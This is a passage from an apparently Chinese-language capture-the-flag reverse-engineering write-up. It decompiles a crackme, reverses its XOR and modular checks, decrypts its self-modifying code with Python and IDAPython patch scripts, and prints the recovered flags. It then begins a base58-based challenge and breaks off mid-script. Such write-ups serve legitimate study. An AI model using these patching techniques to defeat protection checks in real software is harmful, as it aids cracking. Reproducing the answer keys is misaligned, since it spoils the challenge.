class="line">  <span class="built_in">strcpy</span>(v20, <span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(Format, <span class="string">&quot;%20s&quot;</span>);</span><br><span class="line">  v1 = <span class="number">17</span>;</span><br><span class="line">  v2 = <span class="number">8</span>;</span><br><span class="line">  v3 = <span class="number">6</span>;</span><br><span class="line">  v4 = <span class="number">10</span>;</span><br><span class="line">  v5 = <span class="number">15</span>;</span><br><span class="line">  v6 = <span class="number">20</span>;</span><br><span class="line">  v7 = <span class="number">42</span>;</span><br><span class="line">  v8 = <span class="number">59</span>;</span><br><span class="line">  v9 = <span class="number">47</span>;</span><br><span class="line">  v10 = <span class="number">3</span>;</span><br><span class="line">  v11 = <span class="number">47</span>;</span><br><span class="line">  v12 = <span class="number">4</span>;</span><br><span class="line">  v13 = <span class="number">16</span>;</span><br><span class="line">  v14 = <span class="number">72</span>;</span><br><span class="line">  v15 = <span class="number">62</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">7</span>;</span><br><span class="line">  v18 = <span class="number">16</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(Format, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">18</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(v20, &amp;v25);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">17</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v43 = ~(Str[i] &amp; *((_BYTE *)&amp;v39 + i % <span class="number">14</span>)) &amp; (Str[i] | *((_BYTE *)&amp;v39 + i % <span class="number">14</span>));</span><br><span class="line">    <span class="keyword">if</span> ( v43 != *(&amp;v1 + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(v20, &amp;v25);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(v20, &amp;v31);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(v20, &amp;v21);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到最后的判断条件 <code>v43 != *(&amp;v1 + i)</code>，而 v43 是通过一个异或来生成的，因此只需要通过 v1 数组和 v39 数组反向求解得到输入的 Str 即可。</p><p>下面是求解代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">17</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">42</span>, <span class="number">59</span>, <span class="number">47</span>,  <span class="number">3</span>,  <span class="number">47</span>,  <span class="number">4</span>,  <span class="number">16</span>,  <span class="number">72</span>,  <span class="number">62</span>,  <span class="number">0</span>,  <span class="number">7</span>,  <span class="number">16</span>]</span><br><span class="line">xor = <span class="string">&#x27;H_gnisiR&#x27;</span>[::<span class="number">-1</span>] + <span class="string">&#x27;eppo&#x27;</span>[::<span class="number">-1</span>] + <span class="string">&#x27;!r&#x27;</span>[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span> (<span class="built_in">chr</span>(flag[i] ^ <span class="built_in">ord</span>(xor[i % <span class="number">14</span>])), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> ()</span><br><span class="line"><span class="comment"># Caucasus@s_ability</span></span><br></pre></td></tr></table></figure><h2 id="patch-SMC"><a href="#patch-SMC" class="headerlink" title="patch SMC"></a>patch SMC</h2><p>将得到的字符串输入程序，发现需要通过第二个认证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">When the five horns cross, the golden soldier THOUSER is born.</span><br><span class="line">Presented by ZAIA</span><br><span class="line"></span><br><span class="line">      $$$$$$$$$$$$$$  $$$$$$$$$     $$$$$$$    $$$$$$$$$$</span><br><span class="line">      $$$$$$$$$$$$$$ $$$$$$$$$$$    $$$$$$$    $$$$$$$$$$$</span><br><span class="line">     $$$$$$$$$$$$$$ $$$$$$$$$$$$$   $$$$$$$   $$$$$$$$$$$$$</span><br><span class="line">            $$$$$$  $$$$$$ $$$$$$   $$$$$$$  $$$$$$0 $$$$$$</span><br><span class="line">          $$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$0</span><br><span class="line">       $$$$$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">     $$$$$$$$$$$$$$$$$$$             $$$$$                   $$$</span><br><span class="line">   $$$$$$$$$$$$$$$$$$$$       $$$$$$  $$$  $$$$$$       $$$$$$$$$</span><br><span class="line"> $$$$$$$$$$$$$$$$$$$$$         $$$$$$ $$0 $$$$$$         $$$$$$$$</span><br><span class="line"></span><br><span class="line">Input the flag to hijack the ability of Hiden Intelligence:</span><br></pre></td></tr></table></figure><p>在 <code>Strings window</code> 中并没有找到 <code>Input the flag</code> 的字符串，怀疑程序使用了 SMC。</p><h3 id="法一（patch-方法同-HGAME-FAKE）"><a href="#法一（patch-方法同-HGAME-FAKE）" class="headerlink" title="法一（patch  方法同 HGAME FAKE）"></a>法一（patch  方法同 HGAME FAKE）</h3><p>SMC 可以手动 patch 或者使用动态调试 dump，这里先选择手动 patch</p><p>在 ida 的汇编页面中浏览 <code>Data</code> 部分，发现在 <code>0x10040164D</code> 位置有一长串未被 ida 解析的二进制数据，推测这部分是被加密过的代码，按 <code>x</code> 交叉引用找到加密的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_100401A6C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_100401506(byte_10040164D, <span class="number">1045</span>i64, Str);</span><br><span class="line">  sub_10040162B();</span><br><span class="line">  <span class="keyword">return</span> (*(__int64 (**)(<span class="keyword">void</span>))byte_10040164D)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现先用一个函数调用了这段二进制数据，随后调用以这个地址为开头的函数。</p><p>进入 <code>sub_100401506</code> 函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL __fastcall <span class="title">sub_100401506</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  DWORD flOldProtect; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">void</span> *lpAddress; <span class="comment">// [rsp+40h] [rbp+10h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+48h] [rbp+18h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+50h] [rbp+20h]</span></span><br><span class="line"></span><br><span class="line">  lpAddress = a1; <span class="comment">// bytes</span></span><br><span class="line">  v7 = a2;        <span class="comment">// 1045</span></span><br><span class="line">  v8 = a3;        <span class="comment">// Str</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">18</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !VirtualProtect(lpAddress, v7, <span class="number">0x40</span>u, &amp;flOldProtect) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">    *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % <span class="number">18</span> + v8); <span class="comment">// 关键代码</span></span><br><span class="line">  result = VirtualProtect(lpAddress, v7, flOldProtect, &amp;flOldProtect);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把关键代码美化一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">    lpAddress[i] ^= v8[i % <span class="number">18</span>]; <span class="comment">// 关键代码</span></span><br></pre></td></tr></table></figure><p>发现是通过一个异或做的加密，密钥就是第一步中输入的字符串。</p><p>因此写一个python脚本来解密并生成patch文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">smc = [<span class="number">0x16</span>,  <span class="number">0x29</span>, <span class="number">0x0F4</span>,  <span class="number">0x8F</span>,   <span class="number">0x91</span>,  <span class="number">0x72</span>,  <span class="number">0x75</span>,  <span class="number">0x73</span>,    <span class="number">8</span> , <span class="number">0x0FE</span>, <span class="number">0x0F3</span>,  <span class="number">0x45</span>, <span class="number">0x0E2</span>,  <span class="number">0x69</span>,  <span class="number">0x6C</span>,  <span class="number">0x69</span>, <span class="number">0x0B3</span>, <span class="number">0x0FC</span>, <span class="number">0x0D3</span>,  <span class="number">0x61</span>,</span><br><span class="line"> <span class="number">0x75</span>,  <span class="number">0x63</span>,  <span class="number">0x13</span>,<span class="number">0x0D1</span>,  <span class="number">0x6B</span>,   <span class="number">0x73</span>,  <span class="number">0x87</span>, <span class="number">0x0F6</span>, <span class="number">0x0CB</span>,  <span class="number">0x61</span>,  <span class="number">0x62</span>,  <span class="number">0x69</span>, <span class="number">0x0A8</span>,    <span class="number">6</span> ,  <span class="number">0x54</span>,  <span class="number">0x79</span>,  <span class="number">0x84</span>, <span class="number">0x0E4</span>, <span class="number">0x0ED</span>,  <span class="number">0x63</span>,  <span class="number">0x61</span>,</span><br><span class="line"><span class="comment"># 中间部分省略</span></span><br><span class="line"><span class="number">0x0FC</span>, <span class="number">0x0A2</span>,  <span class="number">0x89</span>,  <span class="number">0x2B</span>,  <span class="number">0x74</span>,  <span class="number">0x73</span>,  <span class="number">0x40</span>,  <span class="number">0x9B</span>,  <span class="number">0x1C</span>,  <span class="number">0x60</span>,  <span class="number">0x62</span>,  <span class="number">0x69</span>,  <span class="number">0x84</span>,  <span class="number">0x57</span>,  <span class="number">0x75</span>,  <span class="number">0x79</span>,  <span class="number">0x43</span>,  <span class="number">0x90</span>,  <span class="number">0x48</span>,  <span class="number">0x81</span>, <span class="number">0x0C4</span>,</span><br><span class="line"><span class="number">0x0F0</span>,    <span class="number">1</span> ,    <span class="number">0</span> ,    <span class="number">0</span> ,  <span class="number">0x5D</span>, <span class="number">0x0C3</span>]</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;patch.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Caucasus@s_ability&#x27;</span></span><br><span class="line">title = <span class="string">&#x27;&#x27;&#x27;file_path = &quot;天津垓.exe&quot;</span></span><br><span class="line"><span class="string">fr = open(file_path, &quot;rb&quot;)</span></span><br><span class="line"><span class="string">fw = open(&#x27;modify_&#x27;+file_path, &quot;wb&quot;)</span></span><br><span class="line"><span class="string">data = fr.read()</span></span><br><span class="line"><span class="string">fw.write(data)</span></span><br><span class="line"><span class="string">fw.seek(0xc4d)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">file.write(title)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1045</span>):</span><br><span class="line">    smc[i] ^= (<span class="built_in">ord</span>(<span class="built_in">str</span>[i % <span class="number">18</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1045</span>, <span class="number">50</span>):</span><br><span class="line">    file.write(<span class="string">&#x27;fw.write(&#x27;</span>)</span><br><span class="line">    file.write(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">bytes</span>(smc[i:i + <span class="number">50</span>])&#125;</span>&#x27;</span>)</span><br><span class="line">    file.write(<span class="string">&#x27;)\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>在命令行中依次运行 <code>python solve.py</code> 和 <code>python patch.py</code></p><p>会得到一个新的 exe 文件 <code>modify_天津垓.exe</code></p><p>在 ida 中打开，进入之前解密的地址，发现此时已经可以被解析了</p><h3 id="法二（-idapython-自动-patch）"><a href="#法二（-idapython-自动-patch）" class="headerlink" title="法二（ idapython 自动 patch）"></a>法二（ idapython 自动 patch）</h3><p>自己手动 patch 的好处在于可以避免直接对文件进行操作，如果出现错误不容易复原（毕竟 ida 7.0 没有撤销）。而利用 <code>idapython</code> 的接口进行 patch 则写起来更加方便。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch</span>(<span class="params">start, end</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;Caucasus@s_ability&#x27;</span></span><br><span class="line">    addr = start</span><br><span class="line">    <span class="keyword">while</span>(addr &lt; end + <span class="number">1</span>):</span><br><span class="line">        PatchByte(addr, Byte(addr) ^ <span class="built_in">ord</span>(<span class="built_in">str</span>[(addr - start) % <span class="number">18</span>]))</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span> (addr - start)</span><br></pre></td></tr></table></figure><p>如果将 <code>str</code> 取出作为变量的一部分，这段代码就可以通用到一些其他题目了。</p><p>随后在 ida 的 <code>File &gt; script file</code> 中选择写好的脚本，在 <code>File &gt; script command</code> 中直接输入 <code>patch( &lt;start_addr&gt;, &lt;end_addr&gt;)</code> 即可（具体的 <code>&lt;addr&gt;</code> 可以直接从 ida 的汇编页面中读取）</p><p>点击 <code>run</code> 后即可 patch 成功。</p><h2 id="hijack"><a href="#hijack" class="headerlink" title="hijack"></a>hijack</h2><p>查看上一步中成功解密的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_10040164D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v9 = <span class="number">2007666</span>;</span><br><span class="line">  v10 = <span class="number">2125764</span>;</span><br><span class="line">  v11 = <span class="number">1909251</span>;</span><br><span class="line">  v12 = <span class="number">2027349</span>;</span><br><span class="line">  v13 = <span class="number">2421009</span>;</span><br><span class="line">  v14 = <span class="number">1653372</span>;</span><br><span class="line">  v15 = <span class="number">2047032</span>;</span><br><span class="line">  v16 = <span class="number">2184813</span>;</span><br><span class="line">  v17 = <span class="number">2302911</span>;</span><br><span class="line">  v18 = <span class="number">2263545</span>;</span><br><span class="line">  v19 = <span class="number">1909251</span>;</span><br><span class="line">  v20 = <span class="number">2165130</span>;</span><br><span class="line">  v21 = <span class="number">1968300</span>;</span><br><span class="line">  v22 = <span class="number">2243862</span>;</span><br><span class="line">  v23 = <span class="number">2066715</span>;</span><br><span class="line">  v24 = <span class="number">2322594</span>;</span><br><span class="line">  v25 = <span class="number">1987983</span>;</span><br><span class="line">  v26 = <span class="number">2243862</span>;</span><br><span class="line">  v27 = <span class="number">1869885</span>;</span><br><span class="line">  v28 = <span class="number">2066715</span>;</span><br><span class="line">  v29 = <span class="number">2263545</span>;</span><br><span class="line">  v30 = <span class="number">1869885</span>;</span><br><span class="line">  v31 = <span class="number">964467</span>;</span><br><span class="line">  v32 = <span class="number">944784</span>;</span><br><span class="line">  v33 = <span class="number">944784</span>;</span><br><span class="line">  v34 = <span class="number">944784</span>;</span><br><span class="line">  v35 = <span class="number">728271</span>;</span><br><span class="line">  v36 = <span class="number">1869885</span>;</span><br><span class="line">  v37 = <span class="number">2263545</span>;</span><br><span class="line">  v38 = <span class="number">2283228</span>;</span><br><span class="line">  v39 = <span class="number">2243862</span>;</span><br><span class="line">  v40 = <span class="number">2184813</span>;</span><br><span class="line">  v41 = <span class="number">2165130</span>;</span><br><span class="line">  v42 = <span class="number">2027349</span>;</span><br><span class="line">  v43 = <span class="number">1987983</span>;</span><br><span class="line">  v44 = <span class="number">2243862</span>;</span><br><span class="line">  v45 = <span class="number">1869885</span>;</span><br><span class="line">  v46 = <span class="number">2283228</span>;</span><br><span class="line">  v47 = <span class="number">2047032</span>;</span><br><span class="line">  v48 = <span class="number">1909251</span>;</span><br><span class="line">  v49 = <span class="number">2165130</span>;</span><br><span class="line">  v50 = <span class="number">1869885</span>;</span><br><span class="line">  v51 = <span class="number">2401326</span>;</span><br><span class="line">  v52 = <span class="number">1987983</span>;</span><br><span class="line">  v53 = <span class="number">2243862</span>;</span><br><span class="line">  v54 = <span class="number">2184813</span>;</span><br><span class="line">  v55 = <span class="number">885735</span>;</span><br><span class="line">  v56 = <span class="number">2184813</span>;</span><br><span class="line">  v57 = <span class="number">2165130</span>;</span><br><span class="line">  v58 = <span class="number">1987983</span>;</span><br><span class="line">  v59 = <span class="number">2460375</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(Format, <span class="string">&quot;Input the flag to hijack the ability of Hiden Intelligence:&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, <span class="string">&quot;Progrise Key confirmed. Ready to break.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">&quot;Jacking Break! Zaia Enterprise.&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;%59s&quot;</span>);</span><br><span class="line">  v3 = <span class="number">29477</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, <span class="string">&quot;Not verified!&quot;</span>);</span><br><span class="line">  v62 = <span class="number">2147483659</span>;</span><br><span class="line">  <span class="built_in">printf</span>(Format);</span><br><span class="line">  <span class="built_in">scanf</span>(v5, Str);</span><br><span class="line">  <span class="built_in">printf</span>(v7);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">51</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(v2);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v61 = <span class="number">19683</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v60 = v61 * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)Str[i] % v62; <span class="comment">// 关键代码</span></span><br><span class="line">    <span class="keyword">if</span> ( v60 != *(&amp;v9 + i) ) <span class="comment">// 验证</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(v2);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(v6);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将关键代码美化一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(&amp;v9 + i) != v61 * Str[i] % v62 )</span><br></pre></td></tr></table></figure><p>只要确保式子两端一直相等就行</p><p>程序的输入部分还是存到了 Str 中，因此只需要通过已经定义好的数求出 Str 就可以</p><p>这里直接对 Str 的每一位进行枚举（也可以用 z3 solver 或者求模逆等方法求解）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v[<span class="number">51</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    v[ <span class="number">0</span>] = <span class="number">2007666</span>;</span><br><span class="line">    v[ <span class="number">1</span>] = <span class="number">2125764</span>;</span><br><span class="line"><span class="comment">// 中间省略</span></span><br><span class="line">    v[<span class="number">49</span>] = <span class="number">1987983</span>;</span><br><span class="line">    v[<span class="number">50</span>] = <span class="number">2460375</span>;</span><br><span class="line">    <span class="keyword">int</span> v61 = <span class="number">19683</span>;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0x32</span>; ++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(res = <span class="number">0</span>; res &lt;= <span class="number">0x80</span>; res++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (v[i] == v61 * res % <span class="number">2147483659</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, res);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;Thousandriver_is_1000%_stronger_than_zero-one&#125;</span></span><br></pre></td></tr></table></figure><p>在程序中输入这个字符串后，就能看到如下输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input the flag to hijack the ability of Hiden Intelligence:flag&#123;Thousandriver_is_1000%_stronger_than_zero-one&#125;</span><br><span class="line">Progrise Key confirmed. Ready to break.</span><br><span class="line">Jacking Break! Zaia Enterprise.</span><br></pre></td></tr></table></figure><p>说明我们破解成功了！</p><h1 id="fxck"><a href="#fxck" class="headerlink" title="fxck!"></a>fxck!</h1><p>在输出前经过了两个函数，猜测第一个是加密，第二个是验证</p><p>看一下第一个函数，里面大概有两段代码是有用的</p><p>第一段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v10; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = input_v11[i];</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v12; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 += (<span class="keyword">unsigned</span> __int8)v20[j] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">    v20[j] = v14 % <span class="number">58</span>;</span><br><span class="line">    v14 /= <span class="number">58u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v14 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v12++;</span><br><span class="line">    v20[v4] = v14 % <span class="number">58</span>;</span><br><span class="line">    v14 /= <span class="number">58u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">57</span>; ++k )</span><br><span class="line">  byte_602500[k] ^= byte_602490[k % <span class="number">7</span>] ^ (<span class="keyword">unsigned</span> __int8)k;</span><br><span class="line"><span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; v12; ++l )</span><br><span class="line">  des_v9[v16 + l] = byte_602500[(<span class="keyword">unsigned</span> __int8)v20[v12 - <span class="number">1</span> - l]];<span class="comment">// 转成base58</span></span><br><span class="line">des_v9[v12 + v16] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>一看到一堆58的取模和除法，猜测是base58编码</p><p>然后动调拿一下table</p><p>接下来看第二个函数，发现输入竟然最后比较的时候才出现，整个函数都是用来生成正确密文的，于是直接动调拿密文</p><p>写个脚本求解就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 